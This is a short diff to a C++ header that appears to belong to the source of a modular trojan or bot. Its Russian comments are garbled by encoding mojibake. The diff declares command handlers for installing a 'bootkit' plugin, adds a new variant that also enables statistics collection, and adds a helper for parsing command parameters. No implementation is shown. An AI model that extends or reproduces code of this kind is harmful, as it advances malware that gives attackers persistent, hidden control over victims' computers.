@@ -9,6 +9,7 @@
 //---------------------------------------------------------------------------
 
 #include "windows.h"
+#include "Strings.h"
 
 //*****************************************************************************
 //  ћетоды дл€ работы с плагинами
@@ -157,12 +158,20 @@ namespace Plugin
 	bool ExecuteUpdatePlug(void* Manager, PCHAR Command, PCHAR Args);
 
 
-	// им€ команды обновлени€ плага
+	// им€ команды установки плага буткита
 	extern const char* CommandInstallBk;
 	
-	// объ€вление команды обновлени€ плага
+	// объ€вление команды установки плага буткита
 	bool ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args);
 
+	// им€ команды установки плага буткита с включением сбора статистики
+	extern const char* CommandInstallBkStat;
+
+	// объ€вление команды установки плага буткита с включением сбора статистики
+	bool ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args);
+
+	// ¬озвращает параметр из списка по индексу.
+	string GetParamFromParamListByIndex(const char* ParamList, DWORD ArgIndex);
 }
 
 
